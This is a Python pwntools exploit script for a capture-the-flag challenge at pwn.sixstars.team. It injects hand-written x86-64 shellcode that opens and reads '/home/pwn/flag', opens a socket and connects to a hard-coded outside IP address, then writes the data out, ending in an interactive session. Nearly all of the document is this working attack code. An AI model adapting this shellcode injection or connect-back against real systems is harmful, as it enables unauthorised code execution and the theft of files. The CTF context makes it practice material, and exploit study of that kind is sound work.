#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
context.arch="amd64"
pwn_file="./chall"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 23603)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

  #.qword 0x80655976d2040002
  #.qword 0x0000000000400610
  #  .ascii "\x02\x00\x04\xd2\x76\x59\x65\x80"
  # .ascii "\x10\x06\x40\x00\x00\x00\x00\x00"
# open ,read, socket, connect,send
shellcode = """
  call here
  .ascii "/home/pwn/flag"
  .byte 0
here:
  pop rdi
  mov rax, 0x2
  xor rsi, rsi
  mov rdx, 0x4
  syscall
  mov rdi, 0x0
  xor rax, rax
  mov rsi, 0x601000
  mov rdx, 0x100
  syscall
  mov rax,0x29
  mov edx, 0          
  mov esi, 1          
  mov edi, 2
  syscall
  call there
  .byte 0x2
  .byte 0x00
  .byte 0x04
  .byte 0xd2
  .byte 0x76
  .byte 0x59
  .byte 0x65
  .byte 0x80
  .byte 0x10
  .byte 0x06
  .byte 0x40
  .byte 0x00
  .byte 0x00
  .byte 0x00
  .byte 0x00
  .byte 0x00
there:
  pop rsi
  mov edi,eax
  mov rax, 0x2a
  mov edx, 0x10
  syscall
  mov rax,0x1
  mov rsi, 0x601000
  mov rdx,0x100
  mov rdi,0x1
  syscall
"""

sh = asm(shellcode)


debug()
r.sendlineafter("Give me your shellcode :", sh)

r.interactive()
